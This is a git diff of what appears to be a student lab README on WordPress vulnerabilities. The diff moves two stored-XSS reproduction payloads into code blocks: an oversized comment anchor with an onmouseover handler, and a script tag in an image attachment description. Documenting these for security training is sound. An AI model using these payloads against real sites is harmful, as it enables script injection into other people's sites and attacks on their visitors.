@@ -14,7 +14,11 @@ Time spent: **X** hours spent in total
     - Fixed in version: 4.2.1
   - [ ] GIF Walkthrough: <img src='https://github.com/darras4/WP-vs-Kali/blob/main/1.gif' title='Video Walkthrough' width='' alt='Video Walkthrough' />
   - [ ] Steps to recreate: 
-    - Enter this comment as a text: <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a> .
+    - Enter this comment as a text: 
+    ```
+    <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a> 
+    ```
+ 
     - Replace the '[64 kb]' by something that would make the comment larger than 64 kilobytes.
   - [ ] Affected source code:
     - [Link 1](https://klikki.fi/wordpress-4-2-core-stored-xss/)
@@ -26,7 +30,10 @@ Time spent: **X** hours spent in total
   - [ ] GIF Walkthrough: <img src='https://github.com/darras4/WP-vs-Kali/blob/main/2.gif' title='Video Walkthrough' width='' alt='Video Walkthrough' />
   - [ ] Steps to recreate: 
     - Upload an image as admin.
-    - In the description, add filename <script>alert("Hack Successful");</script> .
+    - In the description, add 
+     ```
+    filename <script>alert("Hack Successful");</script> 
+    ```
     - Click view attachment page.
   - [ ] Affected source code:
     - [Link 1](https://wpscan.com/vulnerability/741d07d1-2476-430a-b82f-e1228a9343a4)
